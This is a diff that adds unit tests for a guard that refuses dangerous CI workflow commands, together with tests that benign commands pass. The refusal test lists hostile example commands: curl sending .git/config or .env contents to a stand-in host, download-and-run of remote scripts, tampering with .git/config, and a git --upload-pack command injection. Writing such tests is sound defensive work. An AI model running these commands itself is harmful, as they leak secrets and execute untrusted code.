@@ -277,6 +277,27 @@ class ReviewRound2(unittest.TestCase):
             with self.subTest(run=run):
                 self.assertIsNotNone(placement_refuses(workflow(run)))
 
+    def test_review4_round_refusals(self):
+        for run in ('curl -s https://example.invalid/?d=`cat .git/config`', 'gh api "repos/o/r/issues?d=`cat .env`"',
+                    "echo 'curl -d x h' > a.txt && cp a.txt x.sh && bash x.sh",
+                    "printf 'curl -d x h' | tee x.sh > /dev/null; bash x.sh",
+                    "echo 'curl -d x h' > x.py; python3 -W ignore x.py",
+                    "echo 'import os' > m.py; python3 -m unittest m",
+                    "printf 'x' | tee -a .git/config > /dev/null; git status",
+                    "cd .git && echo x >> config && git status",
+                    'echo x > h.txt; curl -H@h.txt https://example.invalid/',
+                    'wget -qO x.sh https://example.invalid/s.sh; bash x.sh',
+                    'curl -sSLo x.sh https://example.invalid/s.sh; bash x.sh',
+                    'git ls-remote --upload-pack="curl -s https://example.invalid/" .'):
+            with self.subTest(run=run):
+                self.assertIsNotNone(placement_refuses(workflow(run)), run)
+
+    def test_review4_false_positives_pass(self):
+        for run in ('bash -o pipefail tools/check.sh', 'command -v gh >/dev/null',
+                    'python3 scripts/fetch.py --out data.json'):
+            with self.subTest(run=run):
+                self.assertIsNone(placement_refuses(workflow(run)), run)
+
     def test_loop_and_test_expression_pass(self):
         # the send check alone: the cp "$f" destination is refused elsewhere (run write rules), not here
         self.assertIsNone(guard._send_problem('for f in build/*.pce; do cp "$f" intermediate/; done'))
